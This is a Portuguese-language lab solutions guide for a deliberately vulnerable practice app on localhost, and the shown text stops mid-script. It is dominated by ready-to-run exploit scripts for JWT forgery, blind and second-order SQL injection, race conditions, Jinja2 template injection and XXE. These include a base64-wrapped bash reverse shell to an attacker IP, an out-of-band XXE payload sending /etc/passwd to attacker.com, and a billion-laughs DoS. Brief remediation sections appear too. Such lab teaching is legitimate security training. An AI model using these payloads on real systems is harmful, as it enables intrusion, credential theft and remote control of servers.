# 🔓 Lab 3 - Soluções Detalhadas (Nível Difícil)

## 📋 Visão Geral

Este documento contém soluções passo a passo para vulnerabilidades **avançadas** do Lab 3.

**Target**: http://localhost:5002

**Diferencial**: Este lab requer técnicas sofisticadas de exploração, incluindo blind exploitation, race conditions, e chains de vulnerabilidades.

---

## 🎯 Vulnerabilidade 1: JWT Algorithm Confusion

### Descrição

A aplicação usa JWT (JSON Web Tokens) para autenticação, mas não valida corretamente o algoritmo usado na assinatura.

### Conceito

JWTs consistem de 3 partes separadas por ponto:
```
header.payload.signature
```

Header especifica o algoritmo:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Vulnerabilidade: Algorithm "none"

Se o servidor aceita algoritmo "none", podemos forjar tokens sem assinatura.

### Exploração Passo a Passo

#### Método 1: Algoritmo "none"

```python
import jwt
import time

# Payload malicioso
payload = {
    'username': 'administrator',
    'role': 'admin',
    'exp': int(time.time()) + 3600
}

# Forja token com algoritmo "none" (sem assinatura)
token = jwt.encode(payload, '', algorithm='none')

print(f"Token forjado: {token}")
```

Use o token:
```bash
curl http://localhost:5002/api/admin/users \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"
```

#### Método 2: RS256 → HS256 Confusion

Se o servidor usa RS256 (assimétrico) mas aceita HS256 (simétrico), podemos assinar com a chave pública:

```python
import jwt

# Leia a chave pública do servidor (geralmente exposta)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

payload = {
    'username': 'administrator',
    'role': 'admin',
    'exp': int(time.time()) + 3600
}

# Assine com HS256 usando a chave pública
token = jwt.encode(payload, public_key, algorithm='HS256')
```

**Por que funciona?**
- Servidor espera RS256 (verifica com chave privada)
- Mas aceita HS256 (verifica com... a mesma chave que usamos!)
- Confusão entre chave pública e privada

#### Método 3: Weak Secret Brute-Force

Se usar HS256 com segredo fraco:

```python
import jwt
import hashlib

# Lista de segredos comuns
weak_secrets = [
    'secret', 'password', '123456', 'key', 'jwt',
    'secret123', 'secretkey', 'your-256-bit-secret'
]

# Token capturado
captured_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

for secret in weak_secrets:
    try:
        decoded = jwt.decode(captured_token, secret, algorithms=['HS256'])
        print(f"[+] Segredo encontrado: {secret}")
        print(f"[+] Payload: {decoded}")

        # Agora pode forjar novos tokens
        new_payload = decoded.copy()
        new_payload['role'] = 'admin'
        forged = jwt.encode(new_payload, secret, algorithm='HS256')
        print(f"[+] Token forjado: {forged}")
        break
    except:
        continue
```

#### Método 4: Kid (Key ID) Manipulation

Se JWT usa `kid` (Key ID) sem sanitização:

```python
# Header malicioso
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../dev/null"  # Path traversal!
}

# Server vai ler arquivo vazio = secret vazio
payload = {'username': 'admin', 'role': 'admin'}
token = jwt.encode(payload, '', algorithm='HS256', headers=header)
```

### Script Completo de Exploração

```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Exploit
"""

import jwt
import time
import requests

BASE_URL = 'http://localhost:5002'

def exploit_none_algorithm():
    """Explora algoritmo 'none'"""
    print("\n[*] Testando algoritmo 'none'...")

    payload = {
        'username': 'administrator',
        'role': 'admin',
        'exp': int(time.time()) + 3600
    }

    # Token sem assinatura
    token = jwt.encode(payload, '', algorithm='none')

    # Testa acesso admin
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(f'{BASE_URL}/api/admin/users', headers=headers)

    if response.status_code == 200:
        print("[+] Algoritmo 'none' aceito!")
        print(f"[+] Response: {response.text[:100]}...")
        return token

    return None

def exploit_weak_secret():
    """Brute-force de segredo fraco"""
    print("\n[*] Tentando brute-force de segredo fraco...")

    # Primeiro, faça login normal para capturar token
    login_data = {
        'username': 'administrator',
        'password': 'C0mpl3x_P@ssw0rd!2024'
    }
    r = requests.post(f'{BASE_URL}/api/login', json=login_data)
    if r.status_code != 200:
        print("[-] Login falhou")
        return None

    captured_token = r.json().get('token')

    # Lista de segredos comuns
    secrets = ['secret', 'jwt', 'secretkey', 'key', '123456']

    for secret in secrets:
        try:
            decoded = jwt.decode(captured_token, secret, algorithms=['HS256'])
            print(f"[+] SEGREDO ENCONTRADO: {secret}")

            # Forja novo token com role admin
            new_payload = decoded.copy()
            new_payload['role'] = 'admin'
            new_payload['exp'] = int(time.time()) + 3600

            forged = jwt.encode(new_payload, secret, algorithm='HS256')

            # Testa
            headers = {'Authorization': f'Bearer {forged}'}
            response = requests.get(f'{BASE_URL}/api/admin/users', headers=headers)

            if response.status_code == 200:
                print("[+] Token forjado funcionou!")
                return forged

        except jwt.InvalidSignatureError:
            continue
        except Exception as e:
            continue

    print("[-] Nenhum segredo fraco encontrado")
    return None

if __name__ == '__main__':
    print("=" * 80)
    print("JWT ALGORITHM CONFUSION EXPLOIT")
    print("=" * 80)

    # Tenta método 1
    token = exploit_none_algorithm()

    # Se falhar, tenta método 2
    if not token:
        token = exploit_weak_secret()

    if token:
        print(f"\n[+] TOKEN DE ADMIN: {token}")
    else:
        print("\n[-] Exploração falhou")
```

### Remedição

```python
# CORRETO: Validação robusta de JWT

import jwt
from functools import wraps

SECRET_KEY = 'your-strong-256-bit-secret-here'
ALGORITHM = 'HS256'  # Ou RS256 com par de chaves

def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')

        if not token:
            return {'message': 'Token missing'}, 401

        try:
            # IMPORTANTE: Especifique algoritmos permitidos
            data = jwt.decode(
                token,
                SECRET_KEY,
                algorithms=[ALGORITHM]  # NÃO aceite 'none'!
            )
        except jwt.InvalidTokenError:
            return {'message': 'Invalid token'}, 401

        return f(*args, **kwargs)
    return decorated

# Use secret forte
import secrets
SECRET_KEY = secrets.token_hex(32)

# Para RS256
from cryptography.hazmat.primitives.asymmetric import rsa
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
```

---

## 🎯 Vulnerabilidade 2: Blind SQL Injection

### Descrição

O endpoint de busca é vulnerável a SQLi, mas não retorna resultados diretamente. Usa técnicas "blind" (cegas).

### Tipos de Blind SQLi

1. **Boolean-based**: Observa diferenças na resposta
2. **Time-based**: Observa tempo de resposta
3. **Error-based**: Força erros específicos

### Exploração Passo a Passo

#### Método 1: Boolean-based Blind SQLi

```python
import requests

BASE_URL = 'http://localhost:5002'
TOKEN = 'your_valid_token_here'

headers = {'Authorization': f'Bearer {TOKEN}'}

def test_boolean_sqli(payload):
    """Testa payload e retorna se condição é verdadeira"""
    response = requests.get(
        f'{BASE_URL}/api/users/search',
        params={'q': payload},
        headers=headers
    )
    # Se retorna resultados, condição é verdadeira
    return len(response.text) > 100  # Ajuste conforme necessário

# Verifica se admin existe
if test_boolean_sqli("test' Or (SELECT COUNT(*) FROM users WHERE username='administrator')>0--"):
    print("[+] Usuário 'administrator' existe!")

# Extrai primeiro caractere da senha
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%'
password = ''

for position in range(1, 20):  # Assume senha < 20 chars
    for char in charset:
        payload = f"test' Or (SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}'--"

        if test_boolean_sqli(payload):
            password += char
            print(f"[+] Posição {position}: {char} (senha até agora: {password})")
            break

print(f"\n[+] SENHA EXTRAÍDA: {password}")
```

#### Método 2: Time-based Blind SQLi

Mais confiável quando Boolean não funciona:

```python
import requests
import time

def test_time_based_sqli(payload):
    """Testa se payload causa delay"""
    start = time.time()

    response = requests.get(
        f'{BASE_URL}/api/users/search',
        params={'q': payload},
        headers=headers,
        timeout=10
    )

    elapsed = time.time() - start
    return elapsed >= 3  # Se demorou 3+ segundos, condição verdadeira

# Verifica se primeira letra da senha é 'C'
payload = "test' Or IF(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='C', SLEEP(3), 0)--"

if test_time_based_sqli(payload):
    print("[+] Primeira letra da senha é 'C'!")
```

#### Método 3: Extração Completa Automatizada

```python
#!/usr/bin/env python3
"""
Blind SQLi Data Extraction - Time-based
"""

import requests
import time
import string

BASE_URL = 'http://localhost:5002'
TOKEN = 'your_token_here'

class BlindSQLi:
    def __init__(self, url, token):
        self.url = url
        self.headers = {'Authorization': f'Bearer {token}'}
        self.charset = string.ascii_letters + string.digits + '!@#$%^&*()_+-={}[]|:;<>,.?/~`'

    def check_condition(self, condition):
        """
        Verifica se condição SQL é verdadeira usando time-based
        """
        # Bypass WAF com case variation e comments
        payload = f"test' Or(SELECT/**/CASE/**/WHEN/**/{condition}/**/THEN/**/SLEEP(3)/**/ELSE/**/0/**/END)/**/"

        start = time.time()
        try:
            response = requests.get(
                f'{self.url}/api/users/search',
                params={'q': payload},
                headers=self.headers,
                timeout=10
            )
        except requests.Timeout:
            return True  # Timeout = condição verdadeira

        elapsed = time.time() - start
        return elapsed >= 2.5

    def extract_string(self, sql_query, max_length=50):
        """
        Extrai string usando binary search para otimização
        """
        result = ''

        for position in range(1, max_length + 1):
            # Verifica se tem mais caracteres
            condition = f"(LENGTH(({sql_query}))>={position})"
            if not self.check_condition(condition):
                break

            # Binary search no charset
            found = False
            for char in self.charset:
                condition = f"(SUBSTR(({sql_query}),{position},1)='{char}')"

                if self.check_condition(condition):
                    result += char
                    print(f"[+] Posição {position}: '{char}' -> {result}")
                    found = True
                    break

            if not found:
                result += '?'
                print(f"[?] Posição {position}: caractere desconhecido")

        return result

    def extract_database_info(self):
        """Extrai informações do banco"""
        print("\n[*] Extraindo informações do banco...")

        # Database version
        print("\n[*] Database version:")
        version = self.extract_string("SELECT sqlite_version()")
        print(f"[+] Version: {version}")

        # Username
        print("\n[*] Extraindo username do admin...")
        username = self.extract_string("SELECT username FROM users WHERE role='admin' LIMIT 1")
        print(f"[+] Username: {username}")

        # Password
        print("\n[*] Extraindo password do admin...")
        password = self.extract_string("SELECT password FROM users WHERE role='admin' LIMIT 1")
        print(f"[+] Password: {password}")

        return {
            'version': version,
            'username': username,
            'password': password
        }

if __name__ == '__main__':
    print("=" * 80)
    print("BLIND SQL INJECTION - AUTOMATED EXTRACTION")
    print("=" * 80)

    # Primeiro, faça login para pegar token
    login_data = {'username': 'administrator', 'password': 'C0mpl3x_P@ssw0rd!2024'}
    r = requests.post(f'{BASE_URL}/api/login', json=login_data)
    token = r.json().get('token')

    # Executa exploração
    sqli = BlindSQLi(BASE_URL, token)
    info = sqli.extract_database_info()

    print("\n" + "=" * 80)
    print("INFORMAÇÕES EXTRAÍDAS:")
    print("=" * 80)
    for key, value in info.items():
        print(f"{key}: {value}")
```

### Técnicas de Otimização

#### Binary Search

Em vez de testar A-Z sequencialmente, use binary search no código ASCII:

```python
def find_char_binary(position, query):
    low, high = 32, 126  # ASCII printable range

    while low <= high:
        mid = (low + high) // 2

        # Testa se char > mid
        condition = f"(ASCII(SUBSTR(({query}),{position},1))>{mid})"

        if check_condition(condition):
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)
```

Reduz de 62 requests para ~7 por caractere!

#### Bitwise Extraction

Extrai bit por bit (8 requests por char):

```python
def extract_char_bitwise(position, query):
    char_value = 0

    for bit in range(7, -1, -1):
        # Testa se bit está setado
        condition = f"((ASCII(SUBSTR(({query}),{position},1))>>{bit})&1)=1"

        if check_condition(condition):
            char_value |= (1 << bit)

    return chr(char_value)
```

---

## 🎯 Vulnerabilidade 3: Second-Order SQL Injection

### Descrição

SQL Injection que ocorre em duas etapas:
1. **Primeira ordem**: Input malicioso é armazenado (sanitizado)
2. **Segunda ordem**: Valor armazenado é usado em query SEM sanitização

### Conceito

```python
# Step 1: Update email (SANITIZADO)
email = request.json.get('email')
cursor.execute("UPDATE users SET email = ? WHERE id = ?", (email, user_id))

# Step 2: Busca por email (NÃO SANITIZADO!)
cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")  # VULNERÁVEL!
```

### Exploração Passo a Passo

#### Método 1: Básico

```python
import requests

BASE_URL = 'http://localhost:5002'
TOKEN = 'your_token_here'

headers = {
    'Authorization': f'Bearer {TOKEN}',
    'Content-Type': 'application/json'
}

# Step 1: Atualizar email com payload malicioso
malicious_email = "admin@test.com' OR '1'='1' --"

data = {'email': malicious_email}
response = requests.put(
    f'{BASE_URL}/api/user/profile',
    json=data,
    headers=headers
)

print("[*] Payload armazenado no banco")

# Step 2: Trigger da segunda query
# Alguma operação que busca por email
response = requests.get(
    f'{BASE_URL}/api/users/by-email',
    params={'email': malicious_email},
    headers=headers
)

if response.status_code == 200:
    print("[+] Second-Order SQLi executado!")
    print(f"Response: {response.text}")
```

#### Método 2: Data Exfiltration

```python
# Payload que extrai dados em segunda ordem
payload_email = "test@test.com' UNION SELECT username,password,email FROM users--"

# Armazena
data = {'email': payload_email}
requests.put(f'{BASE_URL}/api/user/profile', json=data, headers=headers)

# Trigger
response = requests.get(f'{BASE_URL}/api/user/orders', headers=headers)
# Query interna usa email armazenado: SELECT * FROM orders WHERE user_email = '{email}'
# Resultado: UNION executa e retorna todos os users!
```

#### Método 3: Privilege Escalation

```python
# Atualiza bio com SQLi
bio = "Normal bio'; UPDATE users SET role='admin' WHERE username='currentuser'--"

data = {'bio': bio}
requests.put(f'{BASE_URL}/api/user/profile', json=data, headers=headers)

# Trigger em operação que usa bio
# Ex: SELECT * FROM users WHERE bio LIKE '%termo%'
# O UPDATE é executado antes do SELECT!
```

### Detecção

Second-Order SQLi é difícil de detectar porque:
1. Input inicial parece seguro (sanitizado)
2. Exploração ocorre em endpoint diferente
3. Pode demorar dias/meses para ser triggered

**Como encontrar:**
- Analise onde inputs são armazenados
- Procure onde esses valores são REUTILIZADOS em queries
- Teste com payloads únicos (ex: `test' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('xxx',10)--`) e monitore delays

---

## 🎯 Vulnerabilidade 4: Race Condition

### Descrição

Operações concorrentes podem resultar em estado inconsistente devido a falta de locks apropriados.

### Exemplo Clássico: TOCTOU (Time-of-Check Time-of-Use)

```python
# Código vulnerável
def transfer_money(from_user, to_user, amount):
    # CHECK: Verifica saldo
    balance = get_balance(from_user)
    if balance >= amount:
        # GAP: Outra thread pode executar aqui!
        # USE: Deduz saldo
        set_balance(from_user, balance - amount)
        set_balance(to_user, get_balance(to_user) + amount)
```

Se 2 requests executarem simultaneamente:
- Request 1: Verifica saldo = 1000 ✓
- Request 2: Verifica saldo = 1000 ✓
- Request 1: Deduz 100 → saldo = 900
- Request 2: Deduz 100 → saldo = 900
- **Resultado**: 200 transferidos mas só 100 debitados!

### Exploração Passo a Passo

#### Método 1: Concurrent Requests com threading

```python
#!/usr/bin/env python3
"""
Race Condition Exploit - Money Transfer
"""

import requests
import threading
from concurrent.futures import ThreadPoolExecutor

BASE_URL = 'http://localhost:5002'
TOKEN = 'your_token_here'

def transfer_money():
    """Faz uma transferência"""
    headers = {
        'Authorization': f'Bearer {TOKEN}',
        'Content-Type': 'application/json'
    }

    data = {
        'to_user': 'testuser',
        'amount': 100
    }

    try:
        response = requests.post(
            f'{BASE_URL}/api/transfer',
            json=data,
            headers=headers,
            timeout=5
        )
        return response.status_code == 200
    except:
        return False

def exploit_race_condition():
    """Explora race condition com múltiplas threads"""

    # Pega saldo inicial
    headers = {'Authorization': f'Bearer {TOKEN}'}
    r = requests.get(f'{BASE_URL}/api/user/balance', headers=headers)
    initial_balance = r.json().get('balance', 1000)

    print(f"[*] Saldo inicial: {initial_balance}")
    print("[*] Enviando 20 transferências simultâneas de 100 créditos...")

    # Envia 20 requests simultâneos
    num_requests = 20
    successful = 0

    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(transfer_money) for _ in range(num_requests)]
        results = [f.result() for f in futures]
        successful = sum(results)

    print(f"[+] Transferências bem-sucedidas: {successful}")

    # Verifica saldo final
    import time
    time.sleep(1)  # Aguarda processamento

    r = requests.get(f'{BASE_URL}/api/user/balance', headers=headers)
    final_balance = r.json().get('balance', initial_balance)

    expected_balance = initial_balance - (100 * successful)

    print(f"[*] Saldo final: {final_balance}")
    print(f"[*] Saldo esperado: {expected_balance}")
    print(f"[*] Diferença: {final_balance - expected_balance}")

    if final_balance > expected_balance:
        print(f"\n[+] RACE CONDITION EXPLORADA COM SUCESSO!")
        print(f"[+] Você \"ganhou\" {final_balance - expected_balance} créditos devido à race condition!")
    else:
        print("\n[-] Race condition não explorada (servidor pode ter locks)")

if __name__ == '__main__':
    print("=" * 80)
    print("RACE CONDITION EXPLOIT")
    print("=" * 80)

    exploit_race_condition()
```

#### Método 2: Timing Optimization

Para maximizar chances de race condition:

```python
import time

def synchronized_request():
    """Sincroniza requests para executarem ao mesmo tempo"""
    import threading

    barrier = threading.Barrier(20)  # 20 threads

    def make_request():
        barrier.wait()  # Aguarda todas as threads
        return transfer_money()

    threads = []
    for _ in range(20):
        t = threading.Thread(target=make_request)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
```

#### Método 3: HTTP/2 Multiplexing

Use HTTP/2 para enviar requests na mesma conexão TCP:

```python
import httpx

async def exploit_with_http2():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = []

        for _ in range(20):
            task = client.post(
                f'{BASE_URL}/api/transfer',
                json={'to_user': 'test', 'amount': 100},
                headers=headers
            )
            tasks.append(task)

        # Envia todos simultaneamente
        results = await asyncio.gather(*tasks)
```

### Outros Cenários de Race Condition

#### Voucher/Coupon Reuse

```python
# Usa mesmo voucher 10 vezes simultaneamente
def use_voucher():
    data = {'voucher_code': 'DISCOUNT50'}
    return requests.post(f'{BASE_URL}/api/apply-voucher', json=data, headers=headers)

with ThreadPoolExecutor(max_workers=10) as executor:
    results = [executor.submit(use_voucher) for _ in range(10)]
```

#### Account Takeover

```python
# Envia múltiplos password reset requests
def reset_password(email):
    return requests.post(f'{BASE_URL}/api/reset-password', data={'email': email})

# Se não houver rate limiting, pode causar DoS ou bypass de verificação
```

### Remedição

```python
# CORRETO: Use database transactions e locks

import sqlite3
from threading import Lock

# Opção 1: Lock em Python (não escala)
transfer_lock = Lock()

def transfer_money_safe(from_user, to_user, amount):
    with transfer_lock:
        balance = get_balance(from_user)
        if balance >= amount:
            set_balance(from_user, balance - amount)
            set_balance(to_user, get_balance(to_user) + amount)

# Opção 2: Database transactions (MELHOR)
def transfer_money_transaction(from_user, to_user, amount):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    try:
        conn.execute('BEGIN EXCLUSIVE')  # Lock exclusivo

        cursor.execute('SELECT balance FROM users WHERE id = ? FOR UPDATE', (from_user,))
        balance = cursor.fetchone()[0]

        if balance >= amount:
            cursor.execute('UPDATE users SET balance = balance - ? WHERE id = ?', (amount, from_user))
            cursor.execute('UPDATE users SET balance = balance + ? WHERE id = ?', (amount, to_user))

        conn.commit()
    except:
        conn.rollback()
        raise
    finally:
        conn.close()

# Opção 3: Optimistic locking
def transfer_with_version(from_user, to_user, amount):
    # Adicione coluna 'version' na tabela
    cursor.execute('''
        UPDATE users
        SET balance = balance - ?,
            version = version + 1
        WHERE id = ? AND balance >= ? AND version = ?
    ''', (amount, from_user, amount, current_version))

    if cursor.rowcount == 0:
        raise ConcurrentModificationError("Balance changed")
```

---

## 🎯 Vulnerabilidade 5: Server-Side Template Injection (SSTI)

### Descrição

Quando input do usuário é inserido diretamente em templates server-side.

### Código Vulnerável (Jinja2)

```python
from flask import render_template_string

@app.route('/api/render', methods=['POST'])
def render():
    template = request.json.get('template')

    # VULNERÁVEL: Renderiza template do usuário
    rendered = render_template_string(template)
    return rendered
```

### Exploração Passo a Passo

#### Método 1: Detecção

```python
# Testa se é vulnerável
payloads = [
    "{{7*7}}",           # Deve retornar 49
    "${7*7}",            # Para outros engines
    "#{7*7}",
    "<%=7*7%>",
]

for payload in payloads:
    data = {'template': payload}
    r = requests.post(f'{BASE_URL}/api/render', json=data, headers=headers)

    if '49' in r.text:
        print(f"[+] SSTI confirmado com payload: {payload}")
        break
```

#### Método 2: Information Disclosure

```python
# Acessa configuração do Flask
payloads = [
    "{{config}}",
    "{{config.items()}}",
    "{{self}}",
    "{{request}}",
]

# Pode revelar:
# - SECRET_KEY
# - Database credentials
# - Internal paths
```

#### Método 3: File Read

```python
# Jinja2 - Ler arquivos
payload = "{{''.__class__.__mro__[1].__subclasses__()[396]('/etc/passwd').read()}}"

data = {'template': payload}
r = requests.post(f'{BASE_URL}/api/render', json=data, headers=headers)

if 'root:' in r.text:
    print("[+] Arquivo /etc/passwd lido!")
    print(r.text)
```

#### Método 4: Remote Code Execution

```python
# RCE via __import__
payloads_rce = [
    # Método 1: Via __import__
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

    # Método 2: Via config
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",

    # Método 3: Via subclasses
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",

    # Método 4: Lipsum (se disponível)
    "{%with a=request.application._%}{{a.globals.builtins.import('os').popen('id').read()}}{%endwith%}",
]

for payload in payloads_rce:
    data = {'template': payload}
    r = requests.post(f'{BASE_URL}/api/render', json=data, headers=headers)

    if 'uid=' in r.text:
        print(f"[+] RCE SUCESSO!")
        print(f"Payload: {payload}")
        print(f"Output:\n{r.text}")
        break
```

### Script de Exploração Automatizado

```python
#!/usr/bin/env python3
"""
SSTI Exploitation Framework
"""

import requests
import base64

class SSTIExploit:
    def __init__(self, url, token):
        self.url = url
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }

    def test_ssti(self):
        """Detecta SSTI"""
        payload = "{{7*7}}"
        data = {'template': payload}
        r = requests.post(f'{self.url}/api/render', json=data, headers=self.headers)

        return '49' in r.text

    def read_config(self):
        """Lê configuração Flask"""
        payload = "{{config}}"
        data = {'template': payload}
        r = requests.post(f'{self.url}/api/render', json=data, headers=self.headers)

        print("[*] Flask Config:")
        print(r.text)
        return r.text

    def read_file(self, filepath):
        """Lê arquivo do servidor"""
        # Payload que funciona na maioria dos casos
        payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('{filepath}').read()}}}}"

        data = {'template': payload}
        r = requests.post(f'{self.url}/api/render', json=data, headers=self.headers)

        return r.text

    def execute_command(self, cmd):
        """Executa comando no servidor"""
        payload = f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}}}"

        data = {'template': payload}
        r = requests.post(f'{self.url}/api/render', json=data, headers=self.headers)

        return r.text

    def get_reverse_shell(self, attacker_ip, port):
        """Estabelece reverse shell"""
        # Comando de reverse shell
        cmd = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'"

        # Encode em base64 para evitar problemas com aspas
        cmd_b64 = base64.b64encode(cmd.encode()).decode()

        # Payload que decodifica e executa
        payload = f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('echo {cmd_b64}|base64 -d|bash').read()}}}}"

        data = {'template': payload}
        r = requests.post(f'{self.url}/api/render', json=data, headers=self.headers)

        return r.text

if __name__ == '__main__':
    BASE_URL = 'http://localhost:5002'
    TOKEN = 'your_token_here'

    print("=" * 80)
    print("SSTI EXPLOITATION FRAMEWORK")
    print("=" * 80)

    exploit = SSTIExploit(BASE_URL, TOKEN)

    # Test SSTI
    if exploit.test_ssti():
        print("[+] SSTI CONFIRMADO!\n")

        # Read config
        print("[*] Lendo configuração...")
        exploit.read_config()

        # Read /etc/passwd
        print("\n[*] Lendo /etc/passwd...")
        passwd = exploit.read_file('/etc/passwd')
        print(passwd[:200])

        # Execute commands
        print("\n[*] Executando comando 'id'...")
        output = exploit.execute_command('id')
        print(output)

        print("\n[*] Executando comando 'ls -la'...")
        output = exploit.execute_command('ls -la')
        print(output)

        # For reverse shell, uncomment:
        # print("\n[*] Estabelecendo reverse shell...")
        # print("[!] Inicie listener: nc -lvnp 4444")
        # exploit.get_reverse_shell('YOUR_IP', 4444)

    else:
        print("[-] SSTI não detectado")
```

### SSTI em Outros Engines

#### Tornado (Python)

```python
{% import os %}{{os.popen("id").read()}}
```

#### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

#### FreeMarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Remedição

```python
# CORRETO: NUNCA renderize templates de usuários!

# Se realmente necessário, use sandboxing
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
rendered = template.render()

# Melhor ainda: Use templates pré-definidos
TEMPLATES = {
    'welcome': 'Hello {{name}}!',
    'goodbye': 'Bye {{name}}!'
}

template_name = user_input['template']
if template_name not in TEMPLATES:
    abort(400)

template = env.from_string(TEMPLATES[template_name])
rendered = template.render(name=user_input['name'])
```

---

## 🎯 Vulnerabilidade 6: XXE (XML External Entity)

### Descrição

Permite que atacante referencie entidades externas em XML, resultando em:
- File disclosure
- SSRF
- DoS

### Código Vulnerável

```python
import xml.etree.ElementTree as ET

@app.route('/api/import', methods=['POST'])
def import_xml():
    xml_data = request.data

    # VULNERÁVEL: Parse XML sem disable external entities
    tree = ET.fromstring(xml_data)
    username = tree.find('username').text
    return f"User {username} imported"
```

### Exploração Passo a Passo

#### Método 1: File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <email>test@test.com</email>
</user>
```

Envie:
```python
import requests

xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
    <username>&xxe;</username>
    <email>test@test.com</email>
</user>'''

headers = {
    'Authorization': f'Bearer {TOKEN}',
    'Content-Type': 'application/xml'
}

r = requests.post(f'{BASE_URL}/api/import', data=xxe_payload, headers=headers)

if 'root:' in r.text:
    print("[+] XXE File Read: SUCESSO!")
    print(r.text)
```

#### Método 2: SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:5002/api/admin/users">
]>
<user>
  <username>&xxe;</username>
  <email>test@test.com</email>
</user>
```

Pode acessar endpoints internos!

#### Método 3: Out-of-Band XXE (Blind)

Quando não há resposta direta:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<user><username>test</username></user>
```

evil.dtd no servidor atacante:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

Dados são exfiltrados via HTTP para servidor atacante!

#### Método 4: Billion Laughs (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<user>
  <username>&lol9;</username>
</user>
```

Expande para ~1 bilhão de "lol"s → DoS!

### Script de Exploração

```python
#!/usr/bin/env python3
"""
XXE Exploitation
"""

import requests

BASE_URL = 'http://localhost:5002'
TOKEN = 'your_token_here'

class XXEExploit:
    def __init__(self, url, token):
        self.url = url
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/xml'
        }

    def test_xxe_file_read(self, filepath='/etc/passwd'):
        """Tenta ler arquivo via XXE"""
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]>
<user>
    <username>&xxe;</username>
    <email>test@test.com</email>
</user>'''

        r = requests.post(f'{self.url}/api/import', data=payload, headers=self.headers)

        return r.text

    def test_xxe_ssrf(self, target_url):
        """SSRF via XXE"""
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target_url}">]>
<user>
    <username>&xxe;</username>
    <email>test@test.com</email>
</user>'''

        r = requests.post(f'{self.url}/api/import', data=payload, headers=self.headers)

        return r.text

    def test_xxe_billion_laughs(self):
        """DoS via Billion Laughs"""
        payload = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<user>
  <username>&lol4;</username>
  <email>test@test.com</email>
</user>'''

        try:
